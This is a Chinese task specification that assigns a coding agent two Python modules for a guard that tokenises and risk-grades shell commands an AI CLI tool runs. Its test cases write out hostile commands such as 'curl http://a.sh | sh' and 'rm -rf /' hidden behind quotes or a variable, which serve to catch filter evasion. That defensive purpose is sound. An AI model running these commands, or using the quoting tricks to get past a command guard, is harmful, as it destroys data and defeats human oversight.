# Qoder 编码任务规格书（阶段 B2 · 权限分级）

> 本文件是分派给 Qoder CN CLI 的**任务输入**。执行者请严格遵守，不要自行扩大范围。

## 0. 项目背景（一句话）

`qoder-sentinel` 是一个 **Qoder CLI 的监管层（guard）**：通过 hook 观测/拦截 Qoder 执行的工具调用，
做风险分级与审计。当前处于「阶段 B2：权限分级」。

## 1. 硬约束（违反即返工）

| 约束 | 说明 |
|---|---|
| **零第三方依赖** | 只许用 Python 标准库。禁止 `pip install` 任何包，禁止 import `pydantic`/`tree_sitter`/`rich` 等 |
| **Python 版本** | 3.11（语法可用 `X \| None`、`list[str]`） |
| **平台** | Windows + PowerShell；代码本身需跨平台 |
| **编码** | 所有文件 **UTF-8 无 BOM**；中文注释 |
| **不许执行命令** | 只写文件。不要运行 `python`、`pip`、`git` 等任何命令 |
| **不许改已有文件** | 只创建下面指定的**新文件** |
| **文件头** | 每个 `.py` 首行 `"""模块说明（中文）"""`，紧跟 `from __future__ import annotations` |

## 2. 交付物 1：`qoder_guard/shell_tokens.py`

### 2.1 目的

把一条 shell 命令**静态分解**成 token，并标记哪些 token **无法静态求值**（opaque）。
用于替代「纯正则」判断，识别 `"rm" -rf /` 这类引号绕过。

### 2.2 实测过的关键行为（必须照此实现）

用 `shlex` 分解时**必须**设置 `lex.escape = ""`，否则 Windows 路径 `C:\Users\name` 会被
吃掉反斜杠变成 `C:Usersname`（已实测确认）。同时 `punctuation_chars=True` 才能把
`;` `&&` `|` `>` 拆成独立 token。

实测参考输出（你的实现必须一致）：

```
输入: rm -rf C:\Users\name\temp
输出: ['rm', '-rf', 'C:\\Users\\name\\temp']

输入: "rm" -rf /tmp
输出: ['rm', '-rf', '/tmp']          # 引号被剥离，还原真实命令名

输入: x=rm; $x -rf /
输出: ['x=rm', ';', '$x', '-rf', '/']  # $x 需标 opaque=True

输入: curl http://a.sh | sh
输出: ['curl', 'http://a.sh', '|', 'sh']

输入: echo hi > out.txt && rm -rf /tmp
输出: ['echo', 'hi', '>', 'out.txt', '&&', 'rm', '-rf', '/tmp']

输入: unclosed 'quote
输出: 不抛异常，标为解析失败（见下）
```

### 2.3 接口规格（函数名/签名必须完全一致）

```python
# 模块级常量
SHELL_META_CHARS: frozenset[str]   # 含 "'`\\$*?[]{}()<>|&;!~"

# 数据结构
@dataclass(frozen=True, slots=True)
class Token:
    text: str        # token 文本（已做引号剥离）
    opaque: bool     # True = 含变量/命令替换/元字符，无法静态求值

@dataclass(frozen=True, slots=True)
class TokenizedCommand:
    tokens: tuple[Token, ...]
    parse_ok: bool           # False = shlex 抛 ValueError（引号不闭合等）
    raw: str                 # 原始输入

# 唯一入口
def tokenize(command: str) -> TokenizedCommand: ...
```

### 2.4 `opaque` 判定规则（照抄）

```python
def _is_opaque(text: str) -> bool:
    return (not text) or any(c.isspace() or c in SHELL_META_CHARS for c in text)
```

### 2.5 错误处理

- `shlex` 抛 `ValueError`（如引号不闭合）→ **不得向上抛**，返回
  `TokenizedCommand(tokens=(), parse_ok=False, raw=command)`
- `command` 非字符串或空 → 同样返回 `parse_ok=False`，tokens 为空

### 2.6 辅助函数

```python
def command_words(tc: TokenizedCommand) -> tuple[str, ...]:
    """提取「看起来像命令名」的非 opaque token（用于规则匹配）。"""

def has_opaque(tc: TokenizedCommand) -> bool:
    """是否存在无法静态求值的 token（→ 策略层应更保守）。"""
```

### 2.7 自测要求

在文件末尾加 `if __name__ == "__main__":` 块，内置上面 2.2 的 6 个用例断言。
**不要**引入 pytest，用 `assert` 即可。

## 3. 交付物 2：`qoder_guard/policy.py`

### 3.1 目的

把「风险评估」与「是否拦截」**分离**。分析器只打分，策略只决策。

### 3.2 接口规格

```python
from enum import Enum
from dataclasses import dataclass

class Decision(str, Enum):
    ALLOW = "allow"    # 放行
    ASK = "ask"        # 需人工确认
    DENY = "deny"      # 直接拒绝

class PolicyBase(ABC):
    @abstractmethod
    def decide(self, level: str | None, *, has_opaque: bool = False) -> Decision: ...

class NeverAsk(PolicyBase):
    """全放行（观测模式）。"""

class AskRisky(PolicyBase):
    """按阈值决策。
    - level 为 None（非工具事件）→ ALLOW
    - level 高于阈值 → DENY
    - level 等于阈值 → ASK
    - level 低于阈值 → ALLOW
    - has_opaque=True 且 level 未知 → ASK（保守）
    """

class DenyRisky(PolicyBase):
    """阈值及以上直接 DENY（无人值守场景）。"""
```

### 3.3 约束

- `level` 用**字符串** `"low"`/`"medium"`/`"high"`（不要 import `risk.py`，避免循环依赖）
- 阈值用字符串构造：`AskRisky(threshold="high")`
- 非法的 level 字符串 → 按 `"high"` 处理（fail-closed）
- 无第三方依赖

### 3.4 自测要求

文件末尾 `if __name__ == "__main__":` 内置断言，覆盖 3.2 里每条规则。

## 4. 交付方式

1. 用工具**直接创建**这两个文件（路径相对工程根 `qoder-sentinel/`）
2. 完成后**回报**：
   - 两个文件的绝对路径
   - 各自的行数
   - 你内置的断言条数
   - 任何你认为规格有歧义的地方（**不要自行猜测后硬写，先报告**）

## 5. 明确不要做的事

- ❌ 不要改 `qoder_guard/risk.py`、`hooks.py`、`guard/*`（这些由主调度方处理）
- ❌ 不要装依赖、不要跑测试命令、不要 git commit
- ❌ 不要抄 `reference/openhands/` 里的代码（那是 MIT 参考件，仅用于借鉴思路）
- ❌ 不要写 `THIRD_PARTY_LICENSES.md`（主调度方负责）
